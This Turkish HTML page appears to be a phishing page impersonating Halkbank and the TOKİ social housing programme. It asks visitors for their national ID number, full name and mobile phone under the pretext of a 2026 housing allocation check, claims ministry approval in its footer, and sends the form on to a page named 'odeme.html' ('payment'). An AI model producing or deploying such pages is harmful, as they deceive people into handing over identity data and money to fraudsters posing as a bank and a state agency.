<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Halkbank - TOKİ Konut Edinme Sistemi</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="navbar">HALKBANK | TOKİ Kurumsal İşlemler</div>
    <div class="container">
        <h2>2026 Sosyal Konut Projesi Tahsis Sorgulama</h2>
        <p>Lütfen konut hak sahipliği durumunuzu kontrol etmek için bilgileri giriniz.</p>
        <form action="odeme.html">
            <input type="text" maxlength="11" placeholder="T.C. Kimlik Numaranız" required>
            <input type="text" placeholder="Adınız Soyadınız" required>
            <input type="tel" placeholder="Sistemde Kayıtlı Cep Telefonu" required>
            <button type="submit">SORGULA VE SÖZLEŞME ONAYLA</button>
        </form>
        <div class="footer-note">Bu portal sadece T.C. Çevre, Şehircilik ve İklim Değişikliği Bakanlığı onaylı hak sahipleri içindir.</div>
    </div>
</body>
</html>
